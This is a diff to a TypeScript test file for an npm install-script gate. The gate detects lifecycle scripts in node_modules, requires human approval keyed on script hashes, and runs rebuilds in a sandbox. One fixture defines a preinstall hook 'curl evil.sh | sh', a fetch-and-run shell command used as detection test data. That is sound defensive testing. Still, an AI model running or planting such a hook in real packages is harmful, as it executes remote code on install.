@@ -7,9 +7,11 @@ import {
   findNodeModulesRoots,
   lockfileFingerprint,
   rebuildPackages,
+  sandboxedNpmRunner,
   scriptHashFor,
   unapprovedScripts,
 } from "./installGate";
+import type { RunSandboxContext } from "./sandbox/context";
 
 let tmp: string | undefined;
 function worktree(): string {
@@ -38,13 +40,13 @@ function addPackage(
 }
 
 describe("install-script gate (spec 14 1h)", () => {
-  it("enumerates lifecycle scripts structurally from the resolved tree", () => {
+  it("enumerates lifecycle scripts structurally from the resolved tree", async () => {
     const wt = worktree();
     addPackage(wt, "clean-pkg", "1.0.0", { test: "vitest" });
     addPackage(wt, "native-pkg", "2.1.0", { postinstall: "node-gyp rebuild" });
     addPackage(wt, "@scope/hooked", "0.3.0", { preinstall: "curl evil.sh | sh" });
 
-    const found = collectLifecycleScripts(wt);
+    const found = await collectLifecycleScripts(wt);
     expect(found.map((p) => p.name).sort()).toEqual(["@scope/hooked", "native-pkg"]);
     const native = found.find((p) => p.name === "native-pkg")!;
     // The verbatim script body travels to the approving human.
@@ -52,7 +54,7 @@ describe("install-script gate (spec 14 1h)", () => {
     expect(native.version).toBe("2.1.0");
   });
 
-  it("finds nested and monorepo node_modules (CLI flags cannot dodge the scan)", () => {
+  it("finds nested and monorepo node_modules (CLI flags cannot dodge the scan)", async () => {
     const wt = worktree();
     // `npm install --ignore-scripts=false` changes how the install RAN, not
     // what is on disk — the scan reads the resolved tree either way.
@@ -61,15 +63,15 @@ describe("install-script gate (spec 14 1h)", () => {
     addPackage(topDir, "nested", "0.1.0", { postinstall: "./build.sh" });
     addPackage(path.join(wt, "packages", "app"), "deep", "3.0.0", { prepare: "husky" });
 
-    const names = collectLifecycleScripts(wt).map((p) => p.name).sort();
+    const names = (await collectLifecycleScripts(wt)).map((p) => p.name).sort();
     expect(names).toEqual(["deep", "nested", "top"]);
     expect(findNodeModulesRoots(wt).length).toBe(2);
   });
 
-  it("diffs against approvals keyed on name + version + scriptHash", () => {
+  it("diffs against approvals keyed on name + version + scriptHash", async () => {
     const wt = worktree();
     addPackage(wt, "native-pkg", "2.1.0", { postinstall: "node-gyp rebuild" });
-    const [pkg] = collectLifecycleScripts(wt);
+    const [pkg] = await collectLifecycleScripts(wt);
 
     // Unapproved → fires.
     expect(unapprovedScripts([pkg], [])).toHaveLength(1);
@@ -121,5 +123,49 @@ describe("install-script gate (spec 14 1h)", () => {
     );
     expect(failed.ok).toBe(false);
     expect(failed.out).toContain("gyp ERR!");
+  });
+
+  it("surfaces a timed-out rebuild as ok:false naming the timeout", async () => {
+    const timedOut = await rebuildPackages("/wt", ["hangs"], async () => ({
+      ok: false,
+      out: "npm rebuild hangs timed out after 300000ms",
+    }));
+    expect(timedOut.ok).toBe(false);
+    expect(timedOut.out).toContain("timed out");
+  });
+
+  it("sandboxedNpmRunner runs npm under the run's env and preamble, re-enabling scripts", async () => {
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "radulf-npm-runner-"));
+    const bin = path.join(dir, "bin");
+    fs.mkdirSync(bin);
+    // A stand-in npm that reports how it was invoked. The run env carries
+    // the agent's ignore-scripts, which the runner must override on the CLI.
+    const stub = path.join(bin, "npm");
+    fs.writeFileSync(
+      stub,
+      '#!/bin/sh\necho "args: $*"\necho "ignore-env: $npm_config_ignore_scripts"\necho "cwd: $(pwd)"\necho "preamble: $RADULF_TEST_PREAMBLE"\n',
+      { mode: 0o755 },
+    );
+    const ctx = {
+      commandPrefix: "export RADULF_TEST_PREAMBLE=ran || true",
+      env: { PATH: `${bin}:/usr/bin:/bin`, npm_config_ignore_scripts: "true" },
+      srtConfig: undefined,
+    } as unknown as RunSandboxContext;
+    try {
+      const result = await sandboxedNpmRunner(ctx)(["rebuild", "native-pkg"], dir);
+      expect(result.ok).toBe(true);
+      expect(result.out).toContain("args: rebuild native-pkg --ignore-scripts=false");
+      expect(result.out).toContain("ignore-env: true");
+      expect(result.out).toContain(`cwd: ${fs.realpathSync(dir)}`);
+      expect(result.out).toContain("preamble: ran");
+
+      fs.writeFileSync(stub, "#!/bin/sh\necho 'gyp ERR!' >&2\nexit 1\n", { mode: 0o755 });
+      expect(await sandboxedNpmRunner(ctx)(["rebuild", "native-pkg"], dir)).toEqual({
+        ok: false,
+        out: "gyp ERR!",
+      });
+    } finally {
+      fs.rmSync(dir, { recursive: true, force: true });
+    }
   });
 });
